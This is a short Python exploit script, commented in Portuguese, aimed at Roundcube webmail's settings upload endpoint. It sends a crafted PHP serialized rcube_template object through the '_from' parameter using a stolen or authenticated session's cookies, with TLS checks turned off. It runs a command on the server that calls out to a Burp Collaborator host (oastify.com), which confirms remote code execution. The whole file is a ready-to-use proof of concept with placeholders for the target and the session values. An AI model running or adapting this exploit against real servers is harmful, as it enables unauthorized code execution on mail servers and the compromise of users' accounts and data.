import urllib.parse
import requests

# ===== CONFIGURAÇÃO DO ALVO =====
target_url = "https://webmail.exemplo.com.br/program/actions/settings/upload.php"

# ===== COOKIES DA SESSÃO AUTENTICADA =====
cookies = {
    "domain_autocompl_webmail": "true",
    "webmailSessionId": "SESSION_ID_AQUI",
    "webmailSessionAuth": "SESSION_AUTH_AQUI",
    "u_domain": "exemplo.com.br"
}

# ===== COMANDO DE EXFILTRAÇÃO PARA O BURP COLLABORATOR =====
cmd = "nslookup seu-identificador.oastify.com"

# ===== GERA PAYLOAD COM A CLASSE VULNERÁVEL DO ROUNDcube =====
payload_obj = f'O:13:"rcube_template":1:{{s:15:"parse_container";s:{len(cmd)}:"{cmd}";}}'
encoded_payload = urllib.parse.quote(payload_obj)

# ===== MONTAGEM DA URL E ENVIO =====
full_url = f"{target_url}?_from={encoded_payload}"
files = {
    "file": ("dummy.txt", "test", "text/plain")
}

# ===== ENVIO DA REQUISIÇÃO =====
response = requests.post(full_url, cookies=cookies, files=files, verify=False)

# ===== EXIBE A RESPOSTA =====
print("[+] Payload enviado para:", full_url)
print("[+] HTTP Status:", response.status_code)
print("[+] Tamanho da resposta:", len(response.text))
print("[*] Verifique agora o Burp Collaborator para validar se a requisição foi recebida.")
                 
